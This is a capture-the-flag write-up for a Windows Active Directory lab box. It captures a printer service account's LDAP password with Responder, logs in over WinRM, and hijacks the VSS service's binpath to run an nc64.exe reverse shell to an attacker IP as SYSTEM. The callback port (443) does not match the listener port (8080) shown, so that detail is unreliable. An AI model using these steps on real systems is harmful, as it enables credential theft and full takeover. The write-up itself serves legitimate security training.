#Windows #ActiveDirectory #Responder #LDAP #WinRM #ServiceAccounts #ServerOperators

## Overview

Return is an easy Windows Active Directory box themed around a printer admin panel. The printer's settings page makes an outbound LDAP connection to whatever server address you configure, which means pointing it at a Responder listener hands over cleartext credentials for a service account. That account is a member of the Server Operators group, a privilege that lets members reconfigure Windows services and abuse them for SYSTEM-level code execution.

## Recon

### Port Scan

The scan fingerprints a Domain Controller: DNS on 53, Kerberos on 88, LDAP on 389 and 3268, and HTTP on 80. The HTTP title gives the theme away immediately.

```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local)
445/tcp  open  microsoft-ds?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local)
Service Info: Host: PRINTER; OS: Windows
```

### Web Enumeration

Port 80 hosts a printer administration panel. The settings page has an editable "Server Address" field that the printer uses to authenticate outbound LDAP connections. This is the attack surface.

## Foothold

### Credential Capture via Responder

Start Responder on the attacking interface, then set the Server Address field to the attacking IP and submit:

```sh
sudo responder -I tun0
```

Responder receives the printer's LDAP authentication attempt in cleartext:

```sh
[LDAP] Cleartext Client   : 10.129.41.143
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

> **Why this works:** many printers and network appliances perform LDAP authentication by binding to a server with plain credentials (LDAP simple bind). When the "server" is Responder, it terminates the connection before any encryption is negotiated, receiving the credentials in the clear. The device is designed to make this connection, so no exploit is needed, just misdirection.

nxc confirms the account has WinRM access:

```sh
nxc winrm 10.129.41.143 -u svc-printer -p '1edFg43012!!'
WINRM  10.129.41.143  5985  PRINTER  [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

```sh
evil-winrm -i 10.129.41.143 -u svc-printer -p '1edFg43012!!'
```

User flag obtained from `C:\Users\svc-printer\desktop\user.txt`.

## Privilege Escalation

### Server Operators → Service Hijack

`svc-printer` is a member of the **Server Operators** group. Members of this group can configure any Windows service, including its binary path, without needing local admin rights.

> **Why Server Operators is dangerous:** the group was intended to let helpdesk staff start and stop services. The ability to change a service's `binpath` means you can redirect any service to an arbitrary executable. Since services run as SYSTEM by default, this is a direct path to privilege escalation.

The account doesn't have access to `sc.exe` via the normal path, but calling it directly works. The Volume Shadow Copy service (`VSS`) is a reliable target:

```powershell
sc.exe config VSS binpath="C:\Users\svc-printer\Documents\nc64.exe -e cmd 10.10.14.70 443"
[SC] ChangeServiceConfig SUCCESS
```

Start the service and catch the callback:

```powershell
sc.exe start VSS
```

```sh
rlwrap nc -lvnp 8080
connect to [10.10.14.70] from (UNKNOWN) [10.129.41.143] 52471

C:\Windows\system32>whoami
nt authority\system
```

## Root

```sh
C:\Users\Administrator\Desktop>type root.txt
‹redacted›
```

## Takeaways

- **Printer and appliance admin panels are credential sources.** Any device that makes authenticated outbound connections to a configurable server address will hand creds to Responder.
- **LDAP simple bind sends credentials in plaintext.** No hash to crack, the password arrives directly.
- **Server Operators is a path to SYSTEM.** Service `binpath` modification requires no additional tooling, just `sc.exe` and a listener.
